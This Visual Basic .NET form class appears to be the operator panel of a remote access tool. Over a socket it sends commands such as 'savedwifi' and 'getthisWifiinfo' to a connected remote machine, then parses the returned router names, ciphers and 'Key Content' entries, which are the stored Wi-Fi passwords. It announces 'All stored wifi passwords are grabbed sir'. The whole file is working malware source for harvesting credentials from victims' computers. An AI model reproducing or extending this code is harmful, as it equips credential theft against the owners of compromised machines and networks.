Public Class Wifipassword
    Public sock As Integer




    Dim Curr As Double = 0.0
#Region "Drag"

    Dim posX As Integer
    Dim posY As Integer
    Dim drag As Boolean



    Private Sub Header_MouseDown(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseDown
        If e.Button = MouseButtons.Left Then
            drag = True
            posX = Cursor.Position.X - Me.Left
            posY = Cursor.Position.Y - Me.Top
        End If
    End Sub

    Private Sub Header_MouseUp(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseUp
        drag = False
    End Sub

    Private Sub Header_MouseMove(ByVal sender As Object, ByVal e As System.Windows.Forms.MouseEventArgs) Handles Label3.MouseMove
        If drag Then
            Me.Top = Cursor.Position.Y - posY
            Me.Left = Cursor.Position.X - posX
        End If
        Me.Cursor = Cursors.Default
    End Sub


    Private Sub buttonClos_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonClos.Click
        Me.Close()
    End Sub



#End Region

    Private Sub Timer1_Tick(sender As System.Object, e As System.EventArgs) Handles Timer1.Tick
        '491
        If Curr < 490 Then
            Curr += 49.1
            Me.Size = New Size(Me.Width, Curr)
        Else
            Timer1.Stop()
            Reforge()
            StartLoad()
        End If

    End Sub
    Sub Reforge() '490 --> 245
        Me.Location = New Point(Screen.PrimaryScreen.WorkingArea.Size.Width / 2 - Me.Width / 2, Screen.PrimaryScreen.WorkingArea.Size.Height / 2 - 245)

        Me.Refresh()
    End Sub

    Private Sub StartLoad()
        Main.S.Send(sock, "savedwifi")
        wifigetter.Start()
    End Sub

     

    Private Sub Button9_Click(sender As System.Object, e As System.EventArgs)
        If ListView2.SelectedItems.Count = 1 Then
            Main.S.Send(sock, "getthisWifiinfo" & Main.Yy & ListView2.SelectedItems(0).Text)

        End If
    End Sub

    Private Sub Wifipassword_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.AllowTransparency = True
        Me.TransparencyKey = Me.BackColor
        ContextMenuStrip2.Enabled = False
        Timer1.Start()
    End Sub

    Private Sub Timer2_Tick(sender As System.Object, e As System.EventArgs) Handles wifigetter.Tick
        Main.S.Send(sock, "wifiMAX")

        wifigetter.Stop()
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs)
        StartLoad()
    End Sub
 
    Private Sub Passwords()
        Main.S.Send(sock, "getthisWifiinfo")
        RichTextBox1.Text = ""
        ListView1.Items.Clear()
        SpeakThread("All stored wifi passwords are grabbed sir ")
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        Passwords()

    End Sub

    Private Sub Prepate()
        For i As Integer = 0 To RichTextBox1.Lines.Length - 1


            If RichTextBox1.Lines(i).Contains("Router : ") Then
                Dim WifiItem = ListView1.Items.Add(RichTextBox1.Lines(i).Replace("Router : ", ""), 0)
                If RichTextBox1.Lines(i + 1).Contains("Authentication") Then
                    WifiItem.SubItems.Add(RichTextBox1.Lines(i + 1).Replace("Authentication", "").Replace(":", "").Replace("       ", ""))
                End If
                If RichTextBox1.Lines(i + 2).Contains("Cipher") Then
                    WifiItem.SubItems.Add(RichTextBox1.Lines(i + 2).Replace("Cipher", "").Replace(":", "").Replace("       ", ""))
                End If
                If RichTextBox1.Lines(i + 3).Contains("Security key") Then
                    WifiItem.SubItems.Add(RichTextBox1.Lines(i + 3).Replace("Security key", "").Replace(":", "").Replace("       ", ""))
                End If
                If RichTextBox1.Lines(i + 4).Contains("Key Content") Then
                    WifiItem.SubItems.Add(RichTextBox1.Lines(i + 4).Replace("Key Content", "").Replace(":", "").Replace("       ", ""))
                End If
            End If
        Next
    End Sub

    Private Sub PreparePasswordsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles PreparePasswordsToolStripMenuItem.Click
        Prepate()

    End Sub
End Class